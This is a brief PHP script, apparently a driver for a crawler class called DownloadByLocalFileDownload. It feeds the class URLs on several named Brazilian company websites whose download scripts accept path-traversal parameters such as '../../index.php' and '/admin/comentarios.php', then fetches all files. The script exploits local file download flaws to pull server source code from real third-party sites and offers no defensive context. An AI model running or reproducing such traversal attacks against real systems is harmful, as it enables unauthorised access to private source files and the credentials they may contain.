<?php
/**
 * Created by PhpStorm.
 * User: lenonleite
 * Date: 01/07/16
 * Time: 18:17
 */

use Aszone\Crawler\DownloadByLocalFileDownload;

require_once __DIR__ . '/vendor/autoload.php';

$command=array();
//$file="http://www.yokogawa.com.br/baixar.php?arquivo=../../index.php";
$url="http://www.leonardi.com.br/baixar.php?arquivo=index.php";
//$file="http://www.leonardi.com.br/baixar.php?arquivo=/admin/comentarios.php";
//$url="http://www.esdm.com.br/include%5Cdownload.asp?file=..//include%5Cdownload.asp";
//$url="http://www.esdm.com.br/include%5Cdownload.asp?file=..//default.asp";
$url="http://www.fiergs.com.br/download.asp?arquivoCaminho=/download.asp&arquivoNome=3728_pdf.pdf";
$crawler = new DownloadByLocalFileDownload($command,$url);

$crawler->getAllFiles();
